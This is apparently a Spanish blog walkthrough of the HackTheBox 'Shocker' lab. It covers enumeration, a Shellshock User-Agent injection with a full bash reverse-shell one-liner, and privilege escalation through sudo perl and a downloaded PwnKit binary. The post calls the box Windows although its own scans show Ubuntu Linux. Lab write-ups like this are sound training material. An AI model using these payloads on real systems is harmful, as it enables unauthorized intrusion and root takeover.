---
title: HTB - Shocker
published: true
categories: [Windows]
tags: [eJPT, eWPT, Fácil]
---

<img src="/assets/HTB/Shocker/shocker.png">

¡Hola!
Vamos a resolver de la máquina `Shocker` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **ShellShock Attack (User-Agent)**
- **Abusing Sudoers Privilege (Perl)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Shocker`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.56
PING 10.10.10.56 (10.10.10.56) 56(84) bytes of data.
64 bytes from 10.10.10.56: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.10.56 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.56 -oG allPorts

PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80 10.10.10.56 -oN targeted

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
whatweb 10.10.10.56

http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]
```
Abrimos el navegador y accedemos a la dirección de la máquina y vemos que su contenido es simplemente una imagen. Parece que no hay mucho donde rascar aquí así que procedemos a aplicar Fuzzing.


<img src="/assets/HTB/Shocker/web.png">



### Fuzzing

* * *

Iniciamos el reconocimiento de potenciales rutas de acceso web.

En esta ocasión usaremos la herramienta **Wfuzz** en formato colorizado `(-c)`, con un total de 200 hilos `(-t 200)`, ocultando todas las respuestas que nos devuelvan un 404 `(--hc=404)` y utilizando el diccionario `directory-list-2.3-medium.txt` de nuestro repositorio de confianza [SecLists](https://github.com/danielmiessler/SecLists) de [Daniel Miessler](https://github.com/danielmiessler)

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000021:   403        11 L     32 W       297 Ch      "cgi-bin"
000000069:   403        11 L     32 W       295 Ch      "icons"
```
Observamos en los resultados el directorio `/cgi-bin/`. Este directorio le permite ejecutar scripts cgi basados en Perl, .cgi shell entre otros por lo que vamos a realizar un escaneo de posibles scripts con extensiones `sh, pl y cgi` que puedan estar almacenados en la carpeta `cgi-bin`

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,sh-pl-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
Total requests: 661638

=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000331:   200        7 L      18 W       119 Ch      "user - sh"     
```
Hemos localizado un script con nombre `user.sh` vamos a observar su contenido

### Análisis Shell Shock Attack

* * *

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"
Content-Type: text/plain

Just an uptime test script

 06:48:14 up  1:08,  0 users,  load average: 0.02, 0.01, 0.00
```

Tenemos un script en la carperta `cgi-bin` por lo que enseguida se nos viene a la mente la posibilidad de que sea vulnerable a un ataque `Shell Shock`. Mediante la herramienta `nmap` vamos a comprobar si es vulnerable a este tipo de ataque

```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 11:52 CET
Nmap scan report for 10.10.10.56
Host is up (0.038s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```
Nmap nos revela que es vulnerable!! 

### Explotación Shell Shock Attack

* * *

La explotación de shell shock se da en la modificación del User-Agent al momento de enviar una petición web, esta cabecera se envía de la siguiente forma `User-Agent: () { :; };echo; <COMANDO A EJECUTAR>`.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
shelly
```
Comprobamos que tenemos ejecución remota de comandos por lo que procedemos a ponernos en escucha en el puerto 443 y mediante la ejecución del siguiente oneliner podemos obtener una reverse shell con el usuario `shelly`

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /bin/bash -i >& /dev/tcp/10.10.14.94/443 0>&1"
```
```bash
sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [10.10.14.94] from (UNKNOWN) [10.10.10.56] 48532
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
shelly@Shocker:/usr/lib/cgi-bin$ 

```

En este punto podemos leer la flag de usuario no privilegiado

```bash
shelly@Shocker:/usr/lib/cgi-bin$ find / -name user.txt 2>/dev/null
/home/shelly/user.txt
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
dbd5261da9d797839***************
shelly@Shocker:/usr/lib/cgi-bin$ 
```

### Escalada Privilegios (SUDO)

* * *

Comprobamos mediante el comando `sudo -l` que podemos ejecutar `/usr/bin/perl` como root

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ 
``` 

Tras consultar el recurso [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) podemos escalar privilegios de la siguiente forma

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
```

### Escalada Privilegios (PWNKIT)

* * *

una forma alternativa de escalar privilegios es buscando archivos en la máquina con permisos SUID asignados

```bash
find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/newuidmap
/bin/ping6
/bin/su
/bin/fusermount
/bin/ntfs-3g
/bin/umount
/bin/ping
/bin/mount
```
Enseguida nos llama la atención `/usr/bin/pkexec`. Con la herramienta PwnKit del repositorio de GitHub de [ly4k](https://github.com/ly4k/PwnKit) procedemos a descargarla en nuestro directorio de trabajo `exploits`

```bash
cd ../exploits
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
```
Una vez descargada la herramienta creamos un servidor http para servir el recurso a la máquina víctima

```bash
python3 -m http.server 80
```
Con el servidor http en marcha procedemos a descargar la herramienta en la máquina víctima en el directorio `/tmp`

```bash
cd /tmp
shelly@Shocker:/tmp$ wget http://10.10.14.94/PwnKit
--2022-10-30 07:43:15--  http://10.10.14.94/PwnKit
Connecting to 10.10.14.94:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.04s   

2022-10-30 07:43:15 (410 KB/s) - 'PwnKit' saved [18040/18040]
```
Ahora sólo nos queda dar permisos de ejecución al binario y ejecutarlo para obtener una shell con el usuario de privilegios elevados.

```bash
shelly@Shocker:/tmp$ chmod +x PwnKit 
shelly@Shocker:/tmp$ ./PwnKit 
root@Shocker:/tmp# whoami
root
```

Ya sólo nos queda leer la flag de root

```bash
root@Shocker:/tmp# find / -name root.txt 
/root/root.txt
root@Shocker:/tmp# cat /root/root.txt
f8940232e337fe39f***************
```

Hemos completado la máquina **Shocker** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Shocker/pwned.png">
